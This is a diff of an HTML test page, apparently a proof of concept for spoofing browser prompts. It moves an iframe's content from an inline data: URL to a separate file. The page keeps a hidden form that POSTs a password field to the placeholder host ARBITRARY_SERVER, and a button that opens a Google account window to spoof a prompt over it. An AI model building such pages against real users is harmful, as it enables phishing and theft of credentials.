@@ -44,38 +44,12 @@
     <button id="iframePromptBtn">Same-Origin iframe Prompt</button>
     <button id="iframeAlertBtn">Same-Origin iframe Alert</button>
     <div id="status"></div>
-    <iframe id="sameOriginFrame" style="display:none;"></iframe>
+    <iframe id="sameOriginFrame" src="iframe-content.html" style="display:none;"></iframe>
     <form id="hiddenForm" class="hidden" method="POST" action="https://ARBITRARY_SERVER">
         <input type="text" id="passwordInput" name="password">
     </form>
 
     <script>
-        // Inline iframe content as a data: URL
-        const iframeContent = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-        <script>
-            window.addEventListener('message', function(event) {
-                if (event.data === 'triggerPrompt') {
-                    const result = prompt('This is a prompt from the same-origin iframe!');
-                    parent.postMessage({type: 'promptResult', value: result}, '*');
-                } else if (event.data === 'triggerAlert') {
-                    alert('This is an alert from the same-origin iframe!');
-                    parent.postMessage({type: 'alertResult', value: 'Alert was shown.'}, '*');
-                }
-            });
-        </script>
-        </head>
-        <body>
-            <p>This is the iframe content.</p>
-        </body>
-        </html>`;
-
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('sameOriginFrame').src = 'data:text/html,' + encodeURIComponent(iframeContent);
-        });
-
         // Spoof Prompt Button
         document.getElementById('triggerBtn').onclick = () => {
             const w = window.open('https://account.google.com/');
